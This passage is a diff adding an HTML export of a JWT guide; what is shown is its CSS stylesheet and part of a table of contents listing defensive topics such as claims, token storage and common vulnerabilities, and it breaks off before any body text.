@@ -1,0 +1,1266 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>JSON Web Token (JWT) - Comprehensive Guide</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2cf562ad-76f0-80a6-9d72-e3897314c582" class="page mono"><header><h1 class="page-title" dir="auto">JSON Web Token (JWT) - Comprehensive Guide</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="ltr"><nav id="2cf562ad-76f0-80bf-ab78-e3b5cbcf6be1" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-80a4-9a03-f68041a04d2d"><strong>Introduction</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8008-bcd9-d6940b78b76b"><strong>What JWT is Used For</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-800f-a8b0-ff578495bdb7"><strong>Why Use JWT?</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-80d7-a704-ff007a658cc3"><strong>What is JWT</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8064-92a3-f9d383a39bee"><strong>Definition</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8054-b0d5-c6f01478626f"><strong>Key Characteristics</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-806f-91cc-cc2ad318def6"><strong>JWT Structure</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-808a-b2b4-e94f75877a23"><strong>1. Header</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8035-8991-de754e4130f8"><strong>2. Payload</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8080-9418-cd61b9ef926a"><strong>3. Signature</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-802f-a92b-e508cae68dc1"><strong>How JWT Works</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80f7-b68f-fb60b035fe74"><strong>JWT Authentication Flow</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80d9-b9f1-d7fc84506924"><strong>Step-by-Step Process</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-804c-8c7d-dcfbbe16a1dd"><strong>JWT Algorithms</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8093-8bd1-fdeb379c810c"><strong>Algorithm Types</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8061-9f50-c3298f5f5a9f"><strong>1. HMAC (Symmetric)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8072-b5c7-c229d143ba0c"><strong>2. RSA (Asymmetric)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-802c-bf78-d3ed4df77bd9"><strong>3. ECDSA (Elliptic Curve)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8059-b4b9-ee35c4a5bf35"><strong>Algorithm Selection Guide</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-80bf-aff3-c4062fdeda05"><strong>JWT Claims</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8006-835a-cefa75dd2cb7"><strong>1. Registered Claims</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8030-8a89-c7fc1a7970ca"><strong>2. Public Claims</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8087-98d9-ce2904c0f7ca"><strong>3. Private Claims</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-802f-9753-ebaf24702d1e"><strong>⚠️ Important: What NOT to Store in Claims</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-806e-b1eb-f30a58f55d0c"><strong>Creating and Verifying JWTs</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80c4-bbec-d15979a41824"><strong>Creating a JWT</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8059-b811-e7e2af7d3bba"><strong>Node.js (jsonwebtoken library)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-800b-ae1c-c5b04b21a053"><strong>Python (PyJWT library)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80dc-8f28-c4ba45b7d63e"><strong>Verifying a JWT</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80df-bcd6-f4ef816b7776"><strong>Node.js</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80c9-9172-d9f126ae88e1"><strong>Python</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-800a-bf50-d5118eead1c9"><strong>Decoding Without Verification (Dangerous!)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-80c3-be6e-e078db958ec4"><strong>JWT Security Considerations</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80e2-a3c3-d3814810452d"><strong>1. Token Storage</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8004-925a-cbdd5ac9193f"><strong>localStorage</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-800d-a80b-e5ad999877a6"><strong>sessionStorage</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8092-9e04-db5d10c2cabb"><strong>httpOnly Cookies</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80b5-bd09-f6b74560921f"><strong>Memory (JavaScript variable)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80ab-a5e3-d49d9427dab4"><strong>2. Token Transmission</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80e7-bfbd-c21be168cff0"><strong>3. Token Expiration</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80bb-b7ea-efadb3825cc7"><strong>4. Secret Key Management</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-801c-ba8d-f412833149f3"><strong>5. Algorithm Whitelisting</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8089-b0fe-e22a84e1403e"><strong>6. Claim Validation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-80bf-bf06-cd7e5d239ab6"><strong>Common Vulnerabilities and Mitigations</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8009-933e-e4e39f546733"><strong>1. Information Leakage</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8003-9195-d3baa10d5c15"><strong>2. Algorithm Confusion Attack</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80ea-90c1-c9d881e8a2f9"><strong>3. Token Theft</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-803f-ab01-c28367fa4849"><strong>4. Replay Attacks</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8018-a44f-e9fcc5fe54ab"><strong>5. Token Expiration Not Validated</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80a8-99ca-c16ebdfeb167"><strong>6. Weak Secret Keys</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8033-adfd-e7d021d2e2be"><strong>7. Insufficient Claim Validation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8044-890e-f9411ca010b6"><strong>8. Key Management Issues</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-80c4-884f-e0651e763278"><strong>Best Practices</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80cc-be6f-e3f3be6c2efe"><strong>1. Use Secure Connection (HTTPS)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-804a-9395-f32e2f5771a4"><strong>2. Never Transfer Sensitive Information</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-808a-8387-de24029934f5"><strong>3. Limit JWT Lifespan</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8007-a367-e8843d344426"><strong>4. Use Long Key Passphrase</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80a0-8a9f-c141b7389a5c"><strong>5. Whitelist Authorized Signature Algorithms</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8036-a034-f71606c057c3"><strong>6. Work with One Signature Algorithm Ideally</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-807e-8bcc-dab49f18e59c"><strong>7. Choose Well-Known and Reliable Libraries</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-8002-8f57-d7c1fe453772"><strong>8. Always Validate and Sanitize Data</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-80a4-8537-f5ac6644ef32"><strong>9. Use httpOnly Cookies for Storage</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-808d-8068-f4003a834a4d"><strong>10. Implement Token Refresh Mechanism</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2cf562ad-76f0-8080-8374-db059dac9a8c"><strong>Implementation Examples</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2cf562ad-76f0-805c-8ecb-f5d57231c2ec"><strong>Node.js/Express - Complete Example</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a 